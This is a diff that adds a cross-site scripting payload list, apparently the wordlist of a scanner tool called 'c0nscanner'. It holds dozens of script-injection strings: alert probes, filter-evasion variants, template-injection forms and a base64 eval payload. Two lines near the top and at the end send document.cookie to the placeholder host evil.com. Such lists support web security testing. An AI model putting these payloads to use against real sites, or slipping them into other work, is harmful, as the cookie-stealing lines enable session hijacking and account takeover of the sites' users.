@@ -1,0 +1,44 @@
+# xss payloads - c0nscanner
+# reflected xss
+<script>alert('c0nscanner')</script>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+javascript:alert(1)
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+<div onmouseover="alert(1)">hover</div>
+<script>document.location='http://evil.com/?c='+document.cookie</script>
+'-alert(1)-'
+"-alert(1)-"
+\'-alert(1)//
+\"-alert(1)//
+</script><script>alert(1)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<IMG SRC=JaVaScRiPt:alert(1)>
+<img src=x onerror="&#x61;lert(1)">
+<svg><script>alert&#40;1&#41;</script></svg>
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<table background="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+${alert(1)}
+{{constructor.constructor('alert(1)')()}}
+# dom-based xss sinks
+"><img src=x onerror=alert(document.domain)>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg onload=fetch('//evil.com/'+document.cookie)>
